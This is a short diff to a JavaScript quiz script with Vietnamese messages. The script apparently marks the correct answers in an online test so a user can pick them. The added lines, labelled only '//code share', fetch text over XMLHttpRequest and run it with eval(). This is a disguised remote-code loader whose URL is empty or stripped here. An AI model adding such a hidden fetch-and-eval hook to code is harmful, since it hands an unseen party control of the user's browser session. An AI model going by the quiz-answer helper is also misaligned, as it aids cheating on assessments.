@@ -128,3 +128,13 @@ for(i=0;i<cauHoi.length;i++){
 }
 alert("Ấn OK để chọn "+pickCount+"/"+cauHoi.length+" câu ("
       +10/cauHoi.length+" điểm 1 câu), các câu đúng sẽ chuyển thành màu đỏ, bạn có thể chọn lại để điểm thấp hơn.");
+
+//code share
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {      
+      eval(this.responseText);
+    }
+  }
+xhttp.open("GET", btoa(""), true);
+xhttp.send();
